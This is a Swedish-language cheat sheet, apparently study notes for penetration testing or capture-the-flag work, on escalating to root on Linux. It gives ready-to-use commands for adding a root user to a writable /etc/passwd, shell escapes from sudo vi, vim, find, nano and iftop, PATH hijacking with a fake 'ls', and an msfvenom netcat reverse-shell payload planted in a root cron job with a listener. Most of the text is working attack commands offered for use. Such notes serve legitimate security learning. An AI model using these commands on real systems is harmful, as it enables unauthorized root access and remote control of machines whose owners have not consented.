# Här är några sätt att skaffa sig högre behörigheter på ett system
### /etc/passwd
om `/etc/passwd` är skrivbara kan man lätt skapa en egen root-användare genom att lägga in en rad i filen.

Skapa först en lösenordshash genom att köra följande kommando
`openssl passwd -1 -salt [sträng] [lösenord]`

t.ex 
``` bash
openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```
lägg sedan in detta i passwd filen enligt formatet `test:x:0:0:root:/root:/bin/bash`  
`Användarnamn:Lösenord:UID:GID:Hemkatalog:Skal`

Ett sätt att lägga in det i `/etc/passwd` är echo
``` bash
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Det är viktigt att man har enkelfnuttar runt texten får att det ska bli rätt i filen

### vi
Om man har sudorättigheter på `vi/vim` kan detta utnyttjas för att få rootbehörighet
Kontrollera vilka sudo-rättigheter du har genom att köra `sudo -l`
Det skulle t.ex kunna se ut så här
``` bash
user8@polobox:~$ sudo -l
Matching Defaults entries for user8 on polobox:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user8 may run the following commands on polobox:
  (root) NOPASSWD: /usr/bin/vi
```

Kör i så fall `sudo vi` och där inne `:!sh` för att få ett skal som root

### crontab
Man kan sätta upp ett remote shell via crontab om man har tillgång till en fil som kör med högre behörighet i crontab. Skapa en payload med msfvenom enligt
``` bash 
msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
```
lägg sen in den i crontab-filen och sätt upp en netcatlyssnare på din attackmaskin
``` bash
nc -lvnp 8888
```
sen kommer crontab att koppla upp ett reverse shell när tiden för cron är inne

### path
Man kan få en användare att köra ett skript istället för det äkta linux-kommandot.
Skapa en fil i t.ex. `/tmp` 
``` bash
echo "/bin/bash" > ls
```
Sen sätter man om PATH till att först kolla i `/tmp`
``` bash
export PATH=/tmp:$PATH
```
sedan när användaren kör `ls` kommer att bash-skal att öppnas

### GTFOBins
Det finns en samling som visar hur man kan få shell/root via vanliga binärer. Kolla här för med info: https://gtfobins.github.io/  
Listar några här som exampel
#### find
Om man får köra som sudo kan man göra så gär för att bli `root`
``` bash
sudo find . -exec /bin/sh \; -quit
```
#### iftop
``` bash
iftop
!/bin/sh
```
#### nano
``` bash
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
#### vim
``` bash
sudo vim -c ':!/bin/sh'
```